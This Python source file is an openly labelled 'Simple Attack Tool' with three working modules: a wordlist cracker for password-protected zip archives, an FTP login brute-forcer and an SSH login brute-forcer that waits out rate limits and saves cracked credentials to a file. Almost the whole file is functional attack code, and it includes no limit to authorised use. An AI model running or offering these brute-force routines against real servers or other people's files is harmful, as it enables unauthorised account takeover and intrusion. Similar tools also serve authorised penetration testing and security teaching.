import os
from zipfile import ZipFile
from pathlib import Path
from tqdm import tqdm
import sys
from ftplib import FTP
import socket
import paramiko
import time

os.system("cls") # Clear screen

print(r"""                         
.__           .__                         
|  |__   ____ |  |   _____   ____   ______
|  |  \ /  _ \|  |  /     \_/ __ \ /  ___/
|   Y  (  <_> )  |_|  Y Y  \  ___/ \___ \ 
|___|  /\____/|____/__|_|  /\___  >____  >
     \/                  \/     \/     \/                                   
                             """)
print("\n****************************************************************")
print("\n* Simple Attack Tool                                           *")
print("\n****************************************************************")
choice = input("""\n Please enter tool of choice:
                1. Zip Unlocker
                2. Brute Force FTP
                3. Brute Force SSH Login
Input the Number: """)
print("You have selected option: ", choice)

# ----------------------------------------------------------------------------------------------------------

if choice == '1':
    os.system("clear")

    print(r"""                         
    .__           .__                         
    |  |__   ____ |  |   _____   ____   ______
    |  |  \ /  _ \|  |  /     \_/ __ \ /  ___/
    |   Y  (  <_> )  |_|  Y Y  \  ___/ \___ \ 
    |___|  /\____/|____/__|_|  /\___  >____  >
        \/                  \/     \/     \/                                   
                                """)
    print("\n****************************************************************")
    print("\n* Zip Unlocker                                                 *")
    print("\n****************************************************************\n")

    # Ask user to input a path to zipped file and wordlist file
    wordlist_path = Path(input('Enter path to the wordlist file > '))
    zip_path = Path(input('Enter path to zipped file      > '))

    def crack():
        zip_file = ZipFile(zip_path)

        # Counts total passwords to try
        with open(wordlist_path, 'rb') as file:
            pass_count = len(file.readlines())

        print(f'Total passwords to try: {pass_count:,}')

        with open(wordlist_path, 'rb') as file:
            for password in tqdm(file, total=pass_count, unit='Password'):
                try:
                    # Tries to extract zip with available password
                    zip_file.extractall(pwd=password.strip())

                except:
                    continue

                else:
                    # If extraction is successful, print the found password
                    print(f'\n\nPassword found: {password.decode().strip()}')
                    exit(0)

        print('Password not found. Try a different wordlist')

    # Checks if provided path is correct
    if wordlist_path.exists() and zip_path.exists():
        crack()
    else:
        print('Error: The path provided is incorrect or does not exist.')
        exit(1)

# ----------------------------------------------------------------------------------------------------------

if choice == '2':
    os.system("clear")

    print(r"""                         
    .__           .__                         
    |  |__   ____ |  |   _____   ____   ______
    |  |  \ /  _ \|  |  /     \_/ __ \ /  ___/
    |   Y  (  <_> )  |_|  Y Y  \  ___/ \___ \ 
    |___|  /\____/|____/__|_|  /\___  >____  >
        \/                  \/     \/     \/                                   
                                """)
    print("\n****************************************************************")
    print("\n* FTP Brute Force                                              *")
    print("\n****************************************************************\n")

    # Function to attempt login using provided data
    def login(target, username, password):
        try:
            # If successful, print the correct credentials
            ftp = FTP(target)
            ftp.login(username, password)
            ftp.quit()
            print("\n[+] Found!")
            print(f"Username: {username}\nPassword: {password}")
            
        except:
            # If failed, continue
            pass

    def bruteForce(target, username, wordlist):
        try:
            with wordlist.open("r") as f:  # Open wordlist
                words = f.readlines()
                for word in tqdm(words, desc="Brute forcing FTP", unit='password'):
                    word = word.strip()  # Strip whitespace
                    login(target, username, word)  # Call the login function
        except FileNotFoundError:  # If file not found, print error
            print("\nError: Wordlist file not found.")
            sys.exit(0)

        except:
            print("\nAn error occurred!")
            sys.exit(0)

    # Ask user input for target, username, and wordlist path
    target = input('Enter IP Target > ')
    user = input('Enter Username > ')
    wordlist = Path(input('Enter path to wordlist file > '))

    # Run bruteForce function
    bruteForce(target, user, wordlist)
    print("\n[+] Brute Force Finished")

# ----------------------------------------------------------------------------------------------------------

if choice == '3':
    os.system("clear")

    print(r"""                         
    .__           .__                         
    |  |__   ____ |  |   _____   ____   ______
    |  |  \ /  _ \|  |  /     \_/ __ \ /  ___/
    |   Y  (  <_> )  |_|  Y Y  \  ___/ \___ \ 
    |___|  /\____/|____/__|_|  /\___  >____  >
        \/                  \/     \/     \/                                   
                                """)
    print("\n****************************************************************")
    print("\n* SSH Login Brute Force                                        *")
    print("\n****************************************************************\n")

    def brute_force_ssh(target, user, wordlist_path):
        port = 22  # Default SSH port
        ssh = paramiko.SSHClient()  # Create SSH client using Paramiko
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Add server host key

        # Opens wordlist and reads words as passwords
        with open(wordlist_path) as file:
            passwords = file.read().splitlines()

        for password in tqdm(passwords, desc="Brute forcing SSH", unit='password'):
            try:
                # Attempt to connect using password from wordlist
                ssh.connect(hostname=target, username=user, password=password, port=port, timeout=3)
            
            # Connection Timeout
            except socket.timeout:
                print(f"\nConnection timed out for host: {target}")
                continue
            
            # Authentication Failure
            except paramiko.AuthenticationException:
                print(f"[ATTEMPT] host: {target} - login: {user} - password: {password}")
           
            # Too many requests
            except paramiko.SSHException:
                print("Too many requests. Waiting for 2 minutes.")
                time.sleep(120)
                continue
            else:
                print(f"\n[Success] Host: {target} Login: {user} Password: {password}")
                # Write successful credentials into a file
                with open("credentials.txt", "a") as file:
                    file.write(f'Host: {target}, Login: {user}, Password: {password}\n')
                break
        else:
            print(f"No valid credentials found in {wordlist_path}")

    def main():
        os.system('clear')

        try:
            # Ask user input for target, username, wordlist path
            target = input('Enter Target Address > ')
            user = input('Enter Username > ')
            wordlist_path = Path(input('Enter path to Wordlist > '))

            # Check for wordlist
            if not wordlist_path.exists():
                print('The specified wordlist file does not exist.')
                sys.exit()
            
            # Run Brute Force Login
            brute_force_ssh(target, user, wordlist_path)

        except KeyboardInterrupt:
            print('\nExiting due to user interruption.\n')
            sys.exit()

    # Run Script
    if __name__ == "__main__":
        main()
